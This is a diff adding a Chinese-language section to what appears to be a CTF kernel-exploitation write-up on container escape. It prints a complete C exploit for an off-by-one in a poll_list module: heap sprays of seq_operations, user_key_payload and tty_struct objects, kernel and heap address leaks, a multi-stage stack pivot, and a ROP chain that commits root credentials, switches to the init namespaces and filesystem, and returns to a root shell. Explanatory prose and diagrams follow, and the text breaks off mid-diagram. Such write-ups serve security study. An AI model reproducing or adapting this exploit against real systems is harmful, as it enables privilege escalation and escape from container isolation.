@@ -3431,8 +3431,1405 @@ $$
               height: auto;">
 </div>
 
+## 6. 进阶分析：容器逃逸
+
+exploit核心代码如下：
+
+```c
+/* ROP Gadgets */
+#define ADD_RSP_0XF8_POP_RBX_RET 0xffffffff81000d55
+#define MOV_RAX_RDI_RET 0xffffffff81000257
+#define PUSH_RAX_POP_RSP_ADD_RSP_0X20_RET 0xffffffff8174ce2d
+#define ADD_RSP_0X50_RET 0xffffffff8116dcf6
+
+#define POP_RDI_RET 0xffffffff810017b9
+#define POP_RCX_RET 0xffffffff8102049c
+#define MOV_RDI_RAX_REP_RDI_RSI_POP_RBX_POP_RBP_POP_R12_RET 0xffffffff8114c39c
+#define POP_RSI_RET 0xffffffff81002140
+#define PUSH_RAX_POP_RBX_RET 0xffffffff810edc67
+#define ADD_RAX_RCX_RET 0xffffffff81024ccf
+#define MOV_RAX_RBX_POP_RBX_RET 0xffffffff8184254d
+
+static size_t mov_rax_rdi_ret;
+static size_t push_rax_pop_rsp_add_rsp_0X20_ret;
+
+/* Kernel Symbols */
+#define PREPARE_KERNEL_CRED 0xffffffff810f2fa0
+#define COMMIT_CREDS 0xffffffff810f2d10
+#define FIND_TASK_BY_VPID 0xffffffff810ebc90
+#define INIT_NSPROXY 0xffffffff8245a980
+#define SWITCH_TASK_NAMESPACES 0xffffffff810f1410
+#define INIT_FS 0xffffffff82589b00
+#define COPY_FS_STRUCT 0xffffffff812fc6a0
+#define SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE 0xffffffff81c00ef0
+#define PROC_SINGLE_SHOW 0xffffffff8133ef70  /* Add symbol for offset calculation */
+
+/* Memory Layout Constants */
+#define HEAP_MASK 0xffff000000000000
+#define KERNEL_MASK 0xffffffff00000000
+#define PAGE_SIZE 4096
+#define MAX_KEYS 199
+#define N_STACK_PPS 30
+#define POLLFD_PER_PAGE 510
+#define POLL_LIST_SIZE 16
+
+/* Calculate number of pollfds based on poll_list size */
+#define NFDS(size) (((size - POLL_LIST_SIZE) / sizeof(struct pollfd)) + N_STACK_PPS)
+
+/* Global Variables */
+pthread_t poll_tid[0x1000];
+size_t poll_threads;
+pthread_mutex_t mutex = PTHREAD_MUTEX_INITIALIZER;
+
+uint64_t proc_single_show;
+uint64_t target_object;
+
+int victim_ptmx;
+int seq_ops[0x10000];
+int ptmx[0x1000];
+int fds[0x1000];
+int keys[0x1000];
+int corrupted_key;
+int n_keys;
+int fd;
+
+/* Thread arguments structure */
+struct t_args {
+    int id;
+    int nfds;
+    int timer;
+    bool suspend;
+};
+
+/* Key payload structure */
+struct rcu_head {
+    void *next;
+    void *func;
+};
+
+struct user_key_payload {
+    struct rcu_head rcu;
+    unsigned short datalen;
+    char *data[];
+};
+
+/* poll_list structure for SLUB spraying */
+struct poll_list {
+    struct poll_list *next;
+    int len;
+    struct pollfd entries[];
+};
+
+/* Utility Functions */
+bool is_kernel_pointer(uint64_t addr) {
+    return ((addr & KERNEL_MASK) == KERNEL_MASK);
+}
+
+bool is_heap_pointer(uint64_t addr) {
+    return ((addr & HEAP_MASK) == HEAP_MASK) && !is_kernel_pointer(addr);
+}
+
+int randint(int min, int max) {
+    return min + (rand() % (max - min));
+}
+
+void init_fd(int i) {
+    fds[i] = open("/etc/passwd", O_RDONLY);
+    if (fds[i] < 0) {
+        log.error("Failed to open /etc/passwd");
+        exit(-1);
+    }
+}
+
+/* Spray seq_operations in kmalloc-32 cache */
+void alloc_seq_ops(int i) {
+    seq_ops[i] = open("/proc/self/stat", O_RDONLY);
+    if (seq_ops[i] < 0) {
+        log.error("Failed to open /proc/self/stat");
+        exit(-1);
+    }
+}
+
+/* Spray user_key_payload in kmalloc-32 cache */
+int alloc_key(int id, char *buff, size_t size) {
+    char desc[256] = {0};
+    char *payload;
+    int key;
+
+    size -= sizeof(struct user_key_payload);
+    sprintf(desc, "payload_%d", id);
+    payload = buff ? buff : calloc(1, size);
+    if (!buff) {
+        memset(payload, id, size);
+    }
+
+    key = key_alloc(desc, payload, size);
+    if (key < 0) {
+        log.error("Failed to allocate key[%d]", id);
+        return -1;
+    }
+
+    return key;
+}
+
+/* Spray poll_list objects via poll() syscall */
+void *alloc_poll_list(void *args) {
+    struct pollfd *pfds;
+    int nfds, timer, id;
+    bool suspend;
+
+    id = ((struct t_args *)args)->id;
+    nfds = ((struct t_args *)args)->nfds;
+    timer = ((struct t_args *)args)->timer;
+    suspend = ((struct t_args *)args)->suspend;
+
+    pfds = calloc(nfds, sizeof(struct pollfd));
+    for (int i = 0; i < nfds; i++) {
+        pfds[i].fd = fds[0];
+        pfds[i].events = POLLERR;
+    }
+
+    bind_thread_core(0);
+
+    pthread_mutex_lock(&mutex);
+    poll_threads++;
+    pthread_mutex_unlock(&mutex);
+
+    int ret = poll(pfds, nfds, timer);
+    bind_thread_core(randint(1, 3));
+
+    if (suspend) {
+        pthread_mutex_lock(&mutex);
+        poll_threads--;
+        pthread_mutex_unlock(&mutex);
+
+        while (1) {
+            sleep(1);
+        }
+    }
+
+    return NULL;
+}
+
+/* Create poll spray thread */
+void create_poll_thread(int id, size_t size, int timer, bool suspend) {
+    struct t_args *args = calloc(1, sizeof(struct t_args));
+
+    if (size > PAGE_SIZE) {
+        size = size - ((size / PAGE_SIZE) * sizeof(struct poll_list));
+    }
+
+    args->id = id;
+    args->nfds = NFDS(size);
+    args->timer = timer;
+    args->suspend = suspend;
+
+    pthread_create(&poll_tid[id], 0, alloc_poll_list, (void *)args);
+}
+
+/* Wait for poll threads to complete */
+void join_poll_threads(void) {
+    for (int i = 0; i < poll_threads; i++) {
+        pthread_join(poll_tid[i], NULL);
+        open("/proc/self/stat", O_RDONLY);
+    }
+    poll_threads = 0;
+}
+
+/* Read key payload data */
+char *get_key(int i, size_t size) {
+    char *data = calloc(1, size);
+    key_read(keys[i], data, size);
+    return data;
+}
+
+/* Leak kernel pointer from corrupted key payload */
+int leak_kernel_pointer(void) {
+    uint64_t *leak;
+    char *key;
+
+    for (int i = 0; i < n_keys; i++) {
+        key = get_key(i, 0x10000);
+        leak = (uint64_t *)key;
+
+        if (is_kernel_pointer(*leak) && (*leak & 0xfff) == 0xf70) {
+            corrupted_key = i;
+            proc_single_show = *leak;
+            kernel_offset = proc_single_show - PROC_SINGLE_SHOW;
+            kernel_base += kernel_offset;
+
+            log.success("Found corrupted user_key_payload at index: %d", corrupted_key);
+            log.success("Kernel base: 0x%llx", kernel_base);
+            log.success("Kernel offset: 0x%llx", kernel_offset);
+
+            free(key);
+            return 0;
+        }
+        free(key);
+    }
+    return -1;
+}
+
+/* Free specific key */
+void free_key(int i) {
+    key_revoke(keys[i]);
+    key_unlink(keys[i]);
+    n_keys--;
+}
+
+/* Free all keys (optionally skip corrupted key) */
+void free_all_keys(bool skip_corrupted_key) {
+    int total = n_keys;
+    for (int i = 0; i < total; i++) {
+        if (skip_corrupted_key && i == corrupted_key) {
+            continue;
+        }
+        free_key(i);
+    }
+    sleep(1);  /* Wait for RCU garbage collection */
+}
+
+/* Spray tty objects in kmalloc-32 cache */
+void alloc_tty(int i) {
+    ptmx[i] = open("/dev/ptmx", O_RDWR | O_NOCTTY);
+    if (ptmx[i] < 0) {
+        log.error("Failed to open /dev/ptmx");
+        exit(-1);
+    }
+}
+
+/* Leak heap pointer of tty_struct from corrupted key */
+int leak_heap_pointer(int kid) {
+    uint64_t *leak;
+    char *key = get_key(kid, 0x20000);
+    leak = (uint64_t *)key;
+
+    for (int i = 0; i < 0x20000 / sizeof(uint64_t); i++) {
+        if (is_heap_pointer(leak[i]) && (leak[i] & 0xff) == 0x00) {
+            if (leak[i + 2] == leak[i + 3] && leak[i + 2] != 0) {
+                target_object = leak[i];
+                log.success("tty_struct heap address: 0x%llx", target_object);
+                log.debug("tty_struct->ops (0x%llx) points to tty_operations", leak[i+2]);
+                free(key);
+                return 0;
+            }
+        }
+    }
+
+    free(key);
+    return -1;
+}
+
+void free_seq_ops(int i) {
+    close(seq_ops[i]);
+}
+
+void free_tty(int i) {
+    close(ptmx[i]);
+}
+
+/* Exploit trigger function */
+static void trigger_exploit_chain(void) {
+    __asm__("mov r15,   mov_rax_rdi_ret;"
+            "mov r14,   push_rax_pop_rsp_add_rsp_0X20_ret;"
+            "mov r13,   0x22222222;"
+            "mov r12,   0x33333333;"
+            "mov rbp,   0x44444444;"
+            "mov rbx,   0x55555555;"
+            "mov r11,   0x66666666;"
+            "mov r10,   0x77777777;"
+            "mov r9,    0x88888888;"
+            "mov r8,    0x99999999;"
+            "mov rax,   0x10;" // ioctl syscall
+            "mov rcx,   0xaaaaaaaa;"
+            "mov rdx,   0xdeadbeaf;"
+            "mov rsi,   0xdeadbeaf;"
+            "mov rdi,   victim_ptmx;" // Trigger through tty_struct->ops->ioctl
+            "syscall");
+}
+
+/* Main exploit routine */
+int main() {
+    char data[0x1000] = {0};
+    char key[32] = {0};
+    uint64_t rop_chain[128];
+    int i = 0;
+
+    /* ===================================================================== */
+    /* Phase 0: Initialization                                               */
+    /* ===================================================================== */
+    log.info("=== Kernel UAF Exploit: Off-by-one in poll_list leading to ROP ===");
+
+    bind_core(0);
+    save_status();
+
+    /* Create xattr target file for user_key_payload spraying */
+    system("touch /home/ctf/lol.txt");
+
+    /* Open vulnerable module */
+    fd = open("/proc/cormon", O_RDWR);
+    if (fd < 0) {
+        log.error("Failed to open vulnerable module /proc/cormon");
+        return -1;
+    }
+
+    /* Prepare file descriptor for poll() */
+    init_fd(0);
+
+    /* ===================================================================== */
+    /* Phase 1: Kernel Base Address Leak via seq_operations->single_show    */
+    /* ===================================================================== */
+    log.info("[Phase 1] Kernel Base Address Leak via seq_operations->single_show");
+
+    /* Step 1-1: Spray 2048 seq_operations objects (kmalloc-32) */
+    log.info("[1-1] Spraying 2048 seq_operations objects in kmalloc-32 cache");
+    for (i = 0; i < 2048; i++) {
+        alloc_seq_ops(i);
+    }
+
+    /* Step 1-2: Spray 72 user_key_payload objects (kmalloc-32) */
+    log.info("[1-2] Spraying 72 user_key_payload objects in kmalloc-32 cache");
+    for (i = 0; i < 72; i++) {
+        setxattr("/home/ctf/lol.txt", "user.x", data, 32, XATTR_CREATE);
+        keys[i] = alloc_key(n_keys++, key, 32);
+    }
+
+    /* Step 1-3: Spray 14 poll_list objects (kmalloc-4096 + kmalloc-32) */
+    bind_core(randint(1, 3));
+    log.info("[1-3] Spraying 14 poll_list objects (kmalloc-4096 + kmalloc-32) for UAF");
+    for (i = 0; i < 14; i++) {
+        create_poll_thread(i, 4096 + 24, 3000, false);
+    }
+
+    bind_core(0);
+    while (poll_threads != 14) {};
+    usleep(250000);
+
+    /* Step 1-4: Spray remaining 127 user_key_payload to fill key quota (199 total) */
+    log.info("[1-4] Spraying remaining 127 user_key_payload objects (total 199)");
+    for (i = 72; i < MAX_KEYS; i++) {
+        setxattr("/home/ctf/lol.txt", "user.x", data, 32, XATTR_CREATE);
+        keys[i] = alloc_key(n_keys++, key, 32);
+    }
+
+    /* Step 1-5: Trigger off-by-one overflow in poll_list to corrupt user_key_payload->datalen */
+    log.info("[1-5] Triggering off-by-one overflow in poll_list to corrupt user_key_payload->datalen");
+    write(fd, data, PAGE_SIZE);
+
+    /* Step 1-6: Arbitrary free via poll_list deallocation (frees user_key_payload) */
+    log.info("[1-6] Triggering arbitrary free via poll_list deallocation (frees user_key_payload)");
+    join_poll_threads();
+
+    /* Step 1-7: Overwrite freed user_key_payload with 128 seq_operations */
+    log.info("[1-7] Overwriting freed user_key_payload with 128 seq_operations");
+    for (i = 2048; i < 2048 + 128; i++) {
+        alloc_seq_ops(i);
+    }
+
+    /* Step 1-8: Leak kernel pointer from seq_operations->single_show */
+    log.info("[1-8] Leaking kernel pointer via seq_operations->single_show");
+    if (leak_kernel_pointer() < 0) {
+        log.error("Kernel pointer leak via seq_operations->single_show failed");
+        exit(-1);
+    }
+
+    /* ===================================================================== */
+    /* Phase 2: Heap Address Leak via tty_struct                            */
+    /* ===================================================================== */
+    log.info("[Phase 2] Heap Address Leak via tty_struct");
+
+    /* Step 2-1: Free 198 non-corrupted user_key_payload objects */
+    log.info("[2-1] Freeing 198 non-corrupted user_key_payload objects");
+    free_all_keys(true);
+
+    /* Step 2-2: Spray 72 tty_file_private objects (kmalloc-32) */
+    log.info("[2-2] Spraying 72 tty_file_private objects (kmalloc-32) to leak tty_struct");
+    for (i = 0; i < 72; i++) {
+        alloc_tty(i);
+    }
+
+    /* Step 2-3: Leak tty_struct heap address from corrupted key data */
+    log.info("[2-3] Leaking tty_struct heap address from corrupted key data");
+    if (leak_heap_pointer(corrupted_key) < 0) {
+        log.error("Heap pointer leak via tty_struct failed");
+        exit(-1);
+    }
+
+    /* ===================================================================== */
+    /* Phase 3: Control Flow Hijacking via tty_struct->ops->ioctl()          */
+    /* ===================================================================== */
+    log.info("[Phase 3] Control Flow Hijacking via tty_struct->ops->ioctl()");
+
+    /* Step 3-1: Free 128 seq_operations to free overlapping chunk */
+    log.info("[3-1] Freeing 128 seq_operations to free overlapping chunk");
+    for (i = 2048; i < 2048 + 128; i++) {
+        free_seq_ops(i);
+    }
+
+    /* Step 3-2: Spray 192 poll_list objects to occupy freed kmalloc-32 chunks */
+    bind_core(randint(1, 3));
+    log.info("[3-2] Spraying 192 poll_list objects to occupy freed kmalloc-32 chunks");
+    for (i = 0; i < 192; i++) {
+        create_poll_thread(i, 24, 3000, true);
+    }
+
+    bind_core(0);
+    while (poll_threads != 192) {};
+    usleep(250000);
+
+    /* Step 3-3: Free corrupted key to free poll_list->next pointer for UAF */
+    log.info("[3-3] Freeing corrupted key to free poll_list->next pointer for UAF");
+    free_key(corrupted_key);
+    sleep(1);
+
+    /* Step 3-4: Forge poll_list->next to point to tty_struct-0x18 */
+    log.info("[3-4] Forging poll_list->next to target_object-0x18 via 199 user_key_payload");
+    *(uint64_t *)&data[0] = target_object - 0x18;
+    for (i = 0; i < MAX_KEYS; i++) {
+        setxattr("/home/ctf/lol.txt", "user.x", data, 32, XATTR_CREATE);
+        keys[i] = alloc_key(n_keys++, key, 32);
+    }
+
+    /* Step 3-5: Free 72 tty_struct objects to create kmalloc-1024 hole */
+    log.info("[3-5] Freeing 72 tty_struct objects to create kmalloc-1024 hole");
+    for (i = 0; i < 72; i++) {
+        free_tty(i);
+    }
+    sleep(1);
+
+    /* Step 3-6: Spray 1024 tty_struct objects to occupy freed tty_struct chunks */
+    log.info("[3-6] Spraying 1024 tty_struct objects in kmalloc-1024 cache");
+    for (i = 0; i < 1024; i++) {
+        alloc_tty(i);
+    }
+
+    /* Step 3-7: Trigger arbitrary free via poll_list->next UAF (frees tty_struct) */
+    log.info("[3-7] Triggering arbitrary free via poll_list->next UAF (frees tty_struct)");
+    while (poll_threads != 0) {};
+
+    /* Step 3-8: Construct and spray ROP chain in freed tty_struct */
+    log.info("[3-8] Constructing ROP chain for privilege escalation");
+
+    // tty_struct->ops->ioctl -> ADD_RSP_0XF8_POP_RBX_RET -> jmp pt_regs -> jmp ADD_RSP_0X50_RET -> jmp POP_RDI_RET
+    rop_chain[0] = 0x0000000100005401;
+    rop_chain[2] = target_object - 0x38;
+    rop_chain[3] = target_object;
+    rop_chain[4] = kernel_offset + ADD_RSP_0X50_RET;
+    rop_chain[12] = kernel_offset + ADD_RSP_0XF8_POP_RBX_RET;
+    i = 15;
+    /* ROP chain for privilege escalation */
+    rop_chain[i++] = kernel_offset + POP_RDI_RET;      /* RDI = 0 */
+    rop_chain[i++] = 0;
+    rop_chain[i++] = kernel_offset + PREPARE_KERNEL_CRED;  /* RAX = prepare_kernel_cred(0) */
+    rop_chain[i++] = kernel_offset + POP_RCX_RET;      /* RCX = 0 */
+    rop_chain[i++] = 0;                               /* Copy length = 0 */
+    rop_chain[i++] = kernel_offset + MOV_RDI_RAX_REP_RDI_RSI_POP_RBX_POP_RBP_POP_R12_RET;  /* RDI = RAX */
+    rop_chain[i++] = 0;                               /* RBX = 0 */
+    rop_chain[i++] = 0;                               /* RBP = 0 */
+    rop_chain[i++] = 0;                               /* R12 = 0 */
+    rop_chain[i++] = kernel_offset + COMMIT_CREDS;    /* commit_creds(cred) */
+
+    /* Switch to init namespace */
+    rop_chain[i++] = kernel_offset + POP_RDI_RET;      /* RDI = 1 (init pid) */
+    rop_chain[i++] = 1;
+    rop_chain[i++] = kernel_offset + FIND_TASK_BY_VPID;  /* RAX = find_task_by_vpid(1) */
+    rop_chain[i++] = kernel_offset + POP_RCX_RET;      /* RCX = 0 */
+    rop_chain[i++] = 0;                               /* Copy length = 0 */
+    rop_chain[i++] = kernel_offset + MOV_RDI_RAX_REP_RDI_RSI_POP_RBX_POP_RBP_POP_R12_RET;  /* RDI = RAX */
+    rop_chain[i++] = 0;                               /* RBX = 0 */
+    rop_chain[i++] = 0;                               /* RBP = 0 */
+    rop_chain[i++] = 0;                               /* R12 = 0 */
+    rop_chain[i++] = kernel_offset + POP_RSI_RET;      /* RSI = init_nsproxy */
+    rop_chain[i++] = kernel_offset + INIT_NSPROXY;
+    rop_chain[i++] = kernel_offset + SWITCH_TASK_NAMESPACES;  /* switch_task_namespaces(task, init_nsproxy) */
+
+    /* Switch to init fs */
+    rop_chain[i++] = kernel_offset + POP_RDI_RET;      /* RDI = init_fs */
+    rop_chain[i++] = kernel_offset + INIT_FS;
+    rop_chain[i++] = kernel_offset + COPY_FS_STRUCT;  /* RAX = copy_fs_struct(init_fs) */
+    rop_chain[i++] = kernel_offset + PUSH_RAX_POP_RBX_RET;  /* RBX = RAX (new_fs) */
+
+    rop_chain[i++] = kernel_offset + POP_RDI_RET;      /* RDI = getpid() */
+    rop_chain[i++] = getpid();
+    rop_chain[i++] = kernel_offset + FIND_TASK_BY_VPID;  /* RAX = current task_struct */
+    rop_chain[i++] = kernel_offset + POP_RCX_RET;      /* RCX = 0x6e0 (task_struct->fs offset) */
+    rop_chain[i++] = 0x6e0;
+    rop_chain[i++] = kernel_offset + ADD_RAX_RCX_RET;  /* RAX = &current->fs */
+    rop_chain[i++] = kernel_offset + MOV_RAX_RBX_POP_RBX_RET;  /* current->fs = new_fs */
+    rop_chain[i++] = 0;                               /* RBX = 0 */
+
+    /* KPTI trampoline to return to userspace */
+    rop_chain[i++] = kernel_offset + SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE + 0x22;
+    rop_chain[i++] = 0;                               /* Dummy RSP */
+    rop_chain[i++] = 0;                               /* Dummy RSP */
+    rop_chain[i++] = (uint64_t)get_root_shell;       /* RIP = get_root_shell */
+    rop_chain[i++] = user_cs;
+    rop_chain[i++] = user_rflags;
+    rop_chain[i++] = user_sp + 0x8;
+    rop_chain[i++] = user_ss;
+
+    log.info("[3-8-1] Freeing all 199 user_key_payload objects");
+    free_all_keys(false);
+
+    log.info("[3-8-2] Spraying 31 user_key_payload with ROP chain in kmalloc-1024");
+    for (i = 0; i < 31; i++) {
+        keys[i] = alloc_key(n_keys++, (char *)rop_chain, 600);
+    }
+
+    /* Step 3-9: Trigger tty_struct->ops->ioctl() to execute ROP chain */
+    log.info("[3-9] Triggering tty_struct->ops->ioctl() for control flow hijack");
+    mov_rax_rdi_ret = kernel_offset + MOV_RAX_RDI_RET;
+    push_rax_pop_rsp_add_rsp_0X20_ret = kernel_offset + PUSH_RAX_POP_RSP_ADD_RSP_0X20_RET;
+    for (i = 0; i < 1024; i++) {
+        victim_ptmx = ptmx[i];
+        trigger_exploit_chain();
+    }
+
+    /* Cleanup 192 suspended poll threads */
+    for (i = 0; i < 192; i++) {
+        pthread_join(poll_tid[i], NULL);
+    }
+
+    return 0;
+}
+```
+
+### 6-1. 技术背景与架构演进
+
+#### 6-1-1. 容器环境下的技术挑战
+
+在现代云原生环境中，容器技术已经成为应用部署的基石。容器通过Linux内核的命名空间、控制组和权能等机制实现资源隔离和安全边界。本章节探讨了在容器环境下如何通过内核内存操作技术突破容器隔离限制，实现从容器内部到主机环境的访问扩展。
+
+容器环境与传统系统环境的主要技术差异体现在以下几个方面：
+
+1. **命名空间隔离**：进程、网络、文件系统、用户等资源的独立视图
+2. **控制组限制**：CPU、内存、IO等资源的配额限制
+3. **权能管理**：进程可执行的特权操作集合
+4. **文件系统隔离**：容器内文件系统与主机文件系统的分离
+5. **网络隔离**：容器网络命名空间的独立网络栈
+
+#### 6-1-2. 容器环境调整的整体技术架构
+
+在容器环境下，技术实现需要考虑命名空间切换、文件系统替换、网络访问等多个维度的调整，同时还需要处理容器内可能存在的额外安全机制和监控。以下是容器环境下的完整技术架构：
+
+```mermaid
+sequenceDiagram
+    participant C as 容器内部
+    participant S1 as 阶段1: 内核基址获取
+    participant S2 as 阶段2: 堆地址信息获取
+    participant S3 as 阶段3: 容器环境调整执行
+
+    Note over C: 开始: 容器受限权限
+
+    C->>S1: 触发阶段1执行
+    S1->>S1: seq_operations内存分配(2048个)
+    S1->>S1: user_key_payload内存分配(72个)
+    S1->>S1: poll_list链表构造(14个)
+    S1->>S1: 单字节内存操作触发
+    S1->>S1: 内存释放条件构建
+    S1->>S1: 内核地址信息获取
+    S1-->>C: 返回内核基址信息
+
+    C->>S2: 触发阶段2执行
+    S2->>S2: 释放非corrupted user_key_payload
+    S2->>S2: 堆喷tty_file_private填充空洞(72个)
+    S2->>S2: 通过越界读取获取tty_struct地址
+    S2->>S2: 释放seq_operations并堆喷poll_list
+    S2->>S2: 释放corrupted user_key_payload并重新堆喷
+    S2->>S2: 设置poll_list->next指向目标tty_struct-0x18
+    S2-->>C: 返回堆地址信息
+
+    C->>S3: 触发阶段3执行
+    S3->>S3: 释放tty_struct并重新堆喷
+    S3->>S3: 释放所有user_key_payload并堆喷控制结构
+    S3->>S3: 构建容器环境调整ROP链
+    S3->>S3: 触发控制流调整
+    S3-->>C: 返回容器环境调整结果
+
+    Note over C: 完成: 容器隔离限制调整
+```
+
+### 6-2. 第一阶段：内核基址获取
+
+#### 6-2-1. 容器环境下的内存操作初始化
+
+在容器环境下，内存操作的基本流程与前文描述一致，但需要考虑容器的资源限制和隔离特性。初始化阶段需要特别注意容器内的文件系统访问权限和资源配额。
+
+**关键内存分配操作**：
+
+```c
+/* 分配2048个seq_operations对象 */
+for (i = 0; i < 2048; i++) {
+    alloc_seq_ops(i);
+}
+
+/* 分配72个user_key_payload对象 */
+for (i = 0; i < 72; i++) {
+    setxattr("/home/ctf/lol.txt", "user.x", data, 32, XATTR_CREATE);
+    keys[i] = alloc_key(n_keys++, key, 32);
+}
+```
+
+**容器环境考虑**：
+
+- **文件系统访问**：容器内可能没有完整的文件系统，需要确保目标文件存在
+- **资源配额**：容器可能有内存限制，大规模内存分配可能失败
+- **权能限制**：某些系统调用可能需要特殊权能
+
+#### 6-2-2. 单字节内存操作与信息获取
+
+在容器环境下，单字节内存操作的流程与前文相同，但需要考虑容器内可能存在的额外安全机制和监控。
+
+**操作触发代码**：
+
+```c
+/* 触发单字节内存操作 */
+write(fd, data, PAGE_SIZE);
+```
+
+**内核地址信息获取**：
+通过`seq_operations->show`函数指针获取内核基址，这一过程在容器内外没有本质差异，但需要注意容器内可能存在的地址空间布局差异。
+
+```c
+/* 内核地址信息获取实现 */
+if (is_kernel_pointer(*leak) && (*leak & 0xfff) == 0xf70) {
+    corrupted_key = i;
+    proc_single_show = *leak;
+    kernel_offset = proc_single_show - PROC_SINGLE_SHOW;
+    kernel_base += kernel_offset;
+}
+```
+
+### 6-3. 第二阶段：堆地址信息获取
+
+#### 6-3-1. 容器环境下的堆地址获取
+
+在容器环境下，堆地址信息的获取流程与前文相同，但需要考虑容器内可能存在的特殊内存布局和分配策略。
+
+**内存清理操作**：
+
+```c
+/* 释放198个非目标user_key_payload对象 */
+free_all_keys(true);
+```
+
+**tty_file_private内存分配**：
+在容器内分配`tty_file_private`对象时，需要注意容器内可能存在的设备访问限制。`/dev/ptmx`设备在容器内通常是可访问的，但可能需要相应的设备权能。
+
+```c
+/* 分配tty_file_private对象 */
+for (i = 0; i < 72; i++) {
+    alloc_tty(i);  /* 打开/dev/ptmx，分配tty_file_private和tty_struct */
+}
+```
+
+**容器环境考虑**：
+
+- **设备访问**：容器内访问`/dev/ptmx`需要`CAP_SYS_ADMIN`或相应的设备权能
+- **命名空间**：终端设备在容器的设备命名空间内
+- **资源隔离**：容器内的终端设备与主机终端设备隔离
+
+#### 6-3-2. 堆地址信息获取机制
+
+在容器环境下，堆地址信息的获取机制与前文相同，但需要考虑容器内可能存在的内存布局差异和验证条件调整。
+
+**堆地址信息获取算法**：
+
+```c
+/* 堆地址信息获取实现 */
+int leak_heap_pointer(int kid) {
+    uint64_t *leak;
+    char *key = get_key(kid, 0x20000);
+    leak = (uint64_t *)key;
+
+    for (int i = 0; i < 0x20000 / sizeof(uint64_t); i++) {
+        /* 验证条件1: 第一个8字节是堆地址且16字节对齐 */
+        if (is_heap_pointer(leak[i]) && (leak[i] & 0xf) == 0x00) {
+            /* 验证条件2: list.next == list.prev 且不为0 */
+            if (leak[i + 2] == leak[i + 3] && leak[i + 2] != 0) {
+                target_object = leak[i];
+                log.success("tty_struct heap address: 0x%llx", target_object);
+                log.debug("tty_file_private->list.next = 0x%llx", leak[i+2]);
+                log.debug("tty_file_private->list.prev = 0x%llx", leak[i+3]);
+                free(key);
+                return 0;
+            }
+        }
+    }
+    return -1;
+}
+```
+
+### 6-4. 第三阶段：容器环境调整执行
+
+#### 6-4-1. 多级栈迁移控制流调整链
+
+在容器环境下，控制流调整面临更多技术挑战，特别是需要处理容器内可能存在的栈保护机制和内存布局差异。本章节采用了**多级栈迁移技术**，通过精心设计的控制流转移序列，实现从`tty_struct->ops->ioctl`到目标ROP链的平滑跳转。关键技术在于利用`trigger_exploit_chain`函数在内核栈的`pt_regs`区域布置控制流转移所需的gadget地址，实现多级跳转。
+
+**控制流转移序列**：
+
+```
+触发点: tty_struct->ops->ioctl
+    ↓
+第一级跳转: ADD_RSP_0XF8_POP_RBX_RET
+    ↓
+栈迁移: 跳转到pt_regs区域的mov_rax_rdi_ret
+    ↓
+寄存器转换: 将RDI移动到RAX
+    ↓
+第二级栈迁移: push_rax_pop_rsp_add_rsp_0X20_ret
+    ↓
+栈指针重定位: 跳转到tty_struct[4]处的ADD_RSP_0X50_RET
+    ↓
+第三级栈调整: ADD_RSP_0X50_RET
+    ↓
+控制流转交: 跳转到POP_RDI_RET
+    ↓
+目标ROP链执行
+```
+
+**详细控制流转移过程**：
+
+1. **初始触发与pt_regs布局**：
+   当`ioctl`系统调用触发时，内核会将用户空间寄存器值保存到内核栈的`pt_regs`结构中。通过`trigger_exploit_chain`函数，在用户空间预先设置寄存器值，这些值会被保存到`pt_regs`中。关键设置包括：
+
+    ```c
+    /* trigger_exploit_chain函数中的寄存器设置 */
+    __asm__("mov r15,   mov_rax_rdi_ret;"      /* pt_regs->r15 */
+            "mov r14,   push_rax_pop_rsp_add_rsp_0X20_ret;"  /* pt_regs->r14 */
+            /* 其他寄存器设置... */
+            "syscall");
+    ```
+
+2. **第一级栈迁移**：
+   初始控制流从`tty_struct->ops->ioctl`跳转到`ADD_RSP_0XF8_POP_RBX_RET`：
+
+    ```c
+    /* 控制流调整链中的关键gadget设置 */
+    rop_chain[12] = kernel_offset + ADD_RSP_0XF8_POP_RBX_RET;
+    ```
+
+    这个gadget执行以下操作：
+    - `add rsp, 0xf8`：将栈指针增加0xf8字节
+    - `pop rbx`：从栈上弹出一个值到rbx寄存器
+    - `ret`：从栈上弹出返回地址并跳转
+
+    这个操作将栈指针从当前栈帧迁移到`pt_regs`结构区域。通过精确计算`0xf8`的偏移量，栈指针被定位到`pt_regs`结构中保存的`r15`寄存器值位置，该值在`trigger_exploit_chain`中被设置为`mov_rax_rdi_ret`的地址。
+
+3. **寄存器值转换**：
+   控制流跳转到`mov_rax_rdi_ret` gadget，执行寄存器值转换：
+    - `mov rax, rdi`：将rdi寄存器的值移动到rax
+    - `ret`：从栈上弹出返回地址并跳转
+
+    此时rdi寄存器包含`tty_struct`的地址（来自`trigger_exploit_chain`中的设置），这个操作将`tty_struct`地址移动到rax寄存器。`ret`指令从栈上弹出`pt_regs`中保存的`r14`寄存器值，该值被设置为`push_rax_pop_rsp_add_rsp_0X20_ret`的地址。
+
+4. **第二级栈迁移**：
+   控制流跳转到`push_rax_pop_rsp_add_rsp_0X20_ret` gadget，执行第二次栈迁移：
+    - `push rax`：将rax值（tty_struct地址）压栈
+    - `pop rsp`：将栈顶值（tty_struct地址）弹出到rsp寄存器
+    - `add rsp, 0x20`：将栈指针增加0x20字节
+    - `ret`：从栈上弹出返回地址并跳转
+
+    这个操作将栈指针从`pt_regs`区域迁移到`tty_struct`结构体内部。通过`add rsp, 0x20`调整，栈指针被定位到`tty_struct[4]`位置，该位置存储了`ADD_RSP_0X50_RET` gadget的地址。
+
+5. **第三级栈调整**：
+   控制流跳转到`ADD_RSP_0X50_RET` gadget，执行第三次栈调整：
+    - `add rsp, 0x50`：将栈指针增加0x50字节
+    - `ret`：从栈上弹出返回地址并跳转
+
+    这个操作进一步调整栈指针，跳过`tty_struct`结构体中的部分字段，定位到`POP_RDI_RET` gadget的起始位置。
+
+6. **控制流转交**：
+   经过三级栈迁移和调整后，栈指针最终指向`POP_RDI_RET` gadget，这是实际ROP链的起始点，开始执行权限提升和容器环境调整的核心逻辑。
+
+**内存布局示意图**：
+
+```
+内核栈布局（控制流转移过程）：
+---------------------------------------------
+| 原始栈帧 (系统调用上下文)                | ← 初始栈指针
+| ...                                    |
+| tty_struct->ops->ioctl 调用栈          |
+---------------------------------------------
+| ADD_RSP_0XF8_POP_RBX_RET 执行位置       |
+---------------------------------------------
+| 增加0xf8字节后的栈位置                  |
+---------------------------------------------
+| pt_regs 结构区域                       | ← 迁移后栈指针
+| ...                                    |
+| r15 = mov_rax_rdi_ret                  |
